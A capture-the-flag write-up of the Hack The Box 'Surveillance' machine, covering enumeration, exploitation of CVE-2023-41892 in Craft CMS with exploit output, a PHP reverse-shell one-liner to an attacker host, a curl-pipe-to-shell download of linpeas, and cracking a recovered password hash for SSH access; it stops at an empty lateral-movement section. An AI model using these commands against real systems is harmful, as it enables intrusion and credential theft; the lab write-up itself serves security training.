# Initial Enumeration
I started of with a full Nmap scan using NmapAutomator.

```bash
./nmapAutomator.sh -H <TARGET_IP> -t All
```

## Ports and Services
|  Service  |  Port  |  Version  |
|-----------|--------|-----------|
|  SSH  | 22/tcp  |  OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) |
|  HTTP  | 80/tcp  |  nginx 1.18.0 (Ubuntu)  |

A web app with the domain `surveillance.htb` was discovered running on port 80.

# Web App Enumeration
The website on `http://surveillance.htb` is of a home security company.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/c7b548fc-59ca-471c-a0af-d39e5a7dd24a)
 Once looking into the source code of the website, we discovered it was created using Craft CMS v4.4.14.

 # Foothold
 A quick Google search for Craft CMS v4.4.14 exploits, revealed [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892), a vulnerability that allows Remote Code Execution. A [PoC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) for this vulonerability was found, however we need to run Burpsuite on our machine and make some adjustments for it to work on our target - changing the return statement in `getTmpUploadDirAndDocumentRoot()`:

```python
if "no value" in match1.group(1):
        return "no value", match2.group(1)
    else:
        return match1.group(1), match2.group(1)
```

Now that we have a working exploit, we can execute it and get RCE on the target as `www-data`:

```bash
┌─[✗]─[dana404@parrot]─[~/Documents/tmp/surveillance]
└──╼ $python3 exploit.py http://surveillance.htb
[-] Get temporary folder and document root ...
HTTP Request:
Method: POST
URL: http://surveillance.htb/
Headers: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36', 'Content-Length': '310', 'Content-Type': 'application/x-www-form-urlencoded'}
Body: action=conditions%2Frender&configObject%5Bclass%5D=craft%5Celements%5Cconditions%5CElementCondition&config=%7B%22name%22%3A%22configObject%22%2C%22as+%22%3A%7B%22class%22%3A%22%5C%5CGuzzleHttp%5C%5CPsr7%5C%5CFnStream%22%2C+%22__construct%28%29%22%3A%7B%22methods%22%3A%7B%22close%22%3A%22phpinfo%22%7D%7D%7D%7D
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Next, we will get a reverse shell by starting a Netcat Listener on our machine (`nc -lvnp 4444`), and executing the following command on the target:

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",4444);shell_exec("/bin/bash <&3 >&3 2>&3");'
```

Once we got the reverse shell, we will run the following command in order to upgrade our shell to a fully functional one:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

# Enumerating the Target Machine
Because we have a fully functional shell, we can use linpeas to enumerate the machine. To so we will:
1. Download [linpeas.sh](https://linpeas.sh/) to our attack machine.
2. Start a python webserver on our attack machine: `sudo python3 -m http.server 80`.
3. From the target machine: access the linpeas file on our machine and run the script: `curl <ATTACK_IP>:80/linpeas.sh | sh`.

Linpeas found an interesting SQL backup file at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql` in which we found a password hash for the user `matthew`!

```sql
LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','<PASSWORD_HASH>','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

We chose to use [CrackStation](https://crackstation.net/) to quickly crack the hash. Now that we have a username and password we can connect to the target using SSH, and find in matthew's home directory the user flag!

```bash
┌─[dana404@parrot]─[~/Documents/Labs/Surveillance]
└──╼ $ssh matthew@10.10.11.245
matthew@10.10.11.245's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 16 01:51:35 PM UTC 2023

  System load:  0.04052734375     Processes:             235
  Usage of /:   84.6% of 5.91GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Dec 16 10:36:33 2023 from 10.10.14.9
matthew@surveillance:~$
```

# Lateral Movement


